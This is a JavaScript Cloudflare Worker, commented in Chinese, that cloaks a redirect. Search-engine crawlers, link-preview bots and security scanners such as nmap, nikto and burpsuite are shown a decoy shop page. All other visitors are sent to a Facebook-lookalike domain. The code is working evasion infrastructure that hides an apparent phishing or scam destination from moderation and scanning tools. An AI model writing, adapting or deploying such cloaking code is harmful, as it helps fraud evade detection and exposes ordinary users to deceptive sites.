export default {
  async fetch(request, env) {
    try {
      const url = new URL(request.url)
      
      // 检查是否有特殊参数，用于测试和调试
      const debugMode = url.searchParams.has('debug')
      
      // 1. 用户代理检测和请求头检测 - 改进检测逻辑
      const userAgent = request.headers.get('user-agent') || ''
      
      // 只有明确检测到爬虫时才显示伪装页面，其他情况都重定向
      const isCrawler = this.isCrawlerOrBot(userAgent)
      const hasSuspiciousHeaders = this.hasSuspiciousHeaders(request.headers)
      
      // 如果是调试模式或者检测到爬虫或可疑请求头，显示伪装页面
      if (debugMode || isCrawler || hasSuspiciousHeaders) {
        console.log('检测到爬虫或可疑请求头，显示伪装页面')
        // 显示伪装页面
        return this.serveDecoyPage(request, env, url, userAgent)
      } else {
        // 2. 对于正常用户，重定向到Facebook链接
        console.log('检测到正常用户，重定向到Facebook')
        return new Response('', {
          status: 302,
          headers: {
            'Location': 'https://www.facebookuser.com/ItTeKwQN',
            // 3. 添加安全相关的HTTP头部
            'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;",
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'Referrer-Policy': 'no-referrer',
            'X-XSS-Protection': '1; mode=block'
          }
        })
      }
      
      // Add CORS headers
      const corsHeaders = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      }

      // Handle OPTIONS request
      if (request.method === 'OPTIONS') {
        return new Response(null, {
          headers: corsHeaders
        })
      }
    } catch (error) {
      console.error('Error:', error)
      return new Response(`Error: ${error.message}`, { status: 500 })
    }
  },
  
  // 检测是否为爬虫或机器人 - 更严格的匹配，避免误判
  isCrawlerOrBot(userAgent) {
    // 明确的爬虫标识
    const strictBotPatterns = [
      'googlebot', 'bingbot', 'yandexbot', 'baiduspider',
      'facebookexternalhit', 'twitterbot', 'rogerbot',
      'linkedinbot', 'embedly', 'quora link preview', 'showyoubot',
      'outbrain', 'pinterest', 'slackbot', 'vkshare', 'w3c_validator',
      'crawler', 'spider', 'ahrefsbot', 'mj12bot', 'dotbot',
      'seznambot', 'applebot', 'exabot', 'ia_archiver'
    ]
    
    // 安全扫描工具
    const scannerPatterns = [
      'nmap', 'nikto', 'acunetix', 'burpsuite', 'owasp', 'zap', 'nessus',
      'metasploit', 'nuclei', 'wappalyzer', 'whatweb', 'masscan'
    ]
    
    userAgent = userAgent.toLowerCase()
    
    // 只有明确匹配爬虫或扫描工具的才返回true
    return strictBotPatterns.some(pattern => userAgent.includes(pattern)) ||
           scannerPatterns.some(pattern => userAgent.includes(pattern))
  },
  
  // 检测可疑的请求头 - 更精确的检测，减少误判
  hasSuspiciousHeaders(headers) {
    // 只检查明确的扫描工具和安全测试相关请求头
    const clearlyMaliciousHeaders = [
      'x-scan', 'x-scanner', 'x-probe', 'x-attack',
      'x-vulnerability-scanner', 'x-pentest'
    ]
    
    for (const header of clearlyMaliciousHeaders) {
      if (headers.has(header)) {
        return true
      }
    }
    
    // 检查Referer是否来自明确的安全测试来源
    const referer = headers.get('referer') || ''
    const suspiciousReferers = ['pentest', 'security-test', 'vulnerability-scan', 'exploit-db']
    return suspiciousReferers.some(term => referer.toLowerCase().includes(term))
  },
  
  // 提供伪装页面
  async serveDecoyPage(request, env, url, userAgent) {
    // 4. 添加安全相关的HTTP头部
    const securityHeaders = {
      'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;",
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Referrer-Policy': 'no-referrer',
      'X-XSS-Protection': '1; mode=block',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
      'Cache-Control': 'no-store, max-age=0'
    }
    
    // 5. 记录检测日志
    console.log(`检测到可疑请求或调试模式: ${userAgent}`)
    
    // 处理根路径
    if (url.pathname === '/' || url.pathname === '') {
      const response = await env.ASSETS.fetch(new Request(`${url.origin}/index.html`, request))
      return this.addSecurityHeaders(response, securityHeaders)
    }
    
    // 处理图片请求 - 支持所有图片格式
    if (this.isImageRequest(url)) {
      try {
        const response = await env.ASSETS.fetch(request)
        return this.addSecurityHeaders(response, securityHeaders)
      } catch (error) {
        console.error(`图片资源不存在: ${url.pathname}`)
        // 如果图片不存在，返回默认图片
        const defaultImageResponse = await env.ASSETS.fetch(new Request(`${url.origin}/electronics.svg`, request))
        return this.addSecurityHeaders(defaultImageResponse, securityHeaders)
      }
    }
    
    // 处理HTML页面请求
    if (url.pathname.endsWith('.html') || url.pathname.includes('product') || url.pathname.includes('category')) {
      try {
        const response = await env.ASSETS.fetch(request)
        return this.addSecurityHeaders(response, securityHeaders)
      } catch (error) {
        console.error(`HTML页面不存在: ${url.pathname}`)
        const response = await env.ASSETS.fetch(new Request(`${url.origin}/index.html`, request))
        return this.addSecurityHeaders(response, securityHeaders)
      }
    }
    
    // 处理JavaScript和CSS文件
    if (url.pathname.endsWith('.js') || url.pathname.endsWith('.css')) {
      try {
        const response = await env.ASSETS.fetch(request)
        return this.addSecurityHeaders(response, securityHeaders)
      } catch (error) {
        console.error(`JS/CSS文件不存在: ${url.pathname}`)
        return new Response('// 文件不存在', { status: 404, headers: securityHeaders })
      }
    }
    
    // 尝试提供请求的其他资源
    try {
      const response = await env.ASSETS.fetch(request)
      return this.addSecurityHeaders(response, securityHeaders)
    } catch (error) {
      // 如果资源不存在，返回首页
      console.error(`资源不存在: ${url.pathname}`)
      const response = await env.ASSETS.fetch(new Request(`${url.origin}/index.html`, request))
      return this.addSecurityHeaders(response, securityHeaders)
    }
  },
  
  // 添加安全头部
  addSecurityHeaders(response, securityHeaders) {
    const newHeaders = new Headers(response.headers)
    Object.keys(securityHeaders).forEach(key => {
      newHeaders.set(key, securityHeaders[key])
    })
    
    return new Response(response.body, {
      status: response.status,
      statusText: response.statusText,
      headers: newHeaders
    })
  },

  addCorsHeaders(response, corsHeaders) {
    const newHeaders = new Headers(response.headers)
    Object.keys(corsHeaders).forEach(key => {
      newHeaders.set(key, corsHeaders[key])
    })

    return new Response(response.body, {
      status: response.status,
      statusText: response.statusText,
      headers: newHeaders
    })
  },
  
  // 检查是否为图片资源请求
  isImageRequest(url) {
    return url.pathname.endsWith('.svg') || url.pathname.endsWith('.png') || url.pathname.endsWith('.jpg') || url.pathname.endsWith('.jpeg')
  }
}
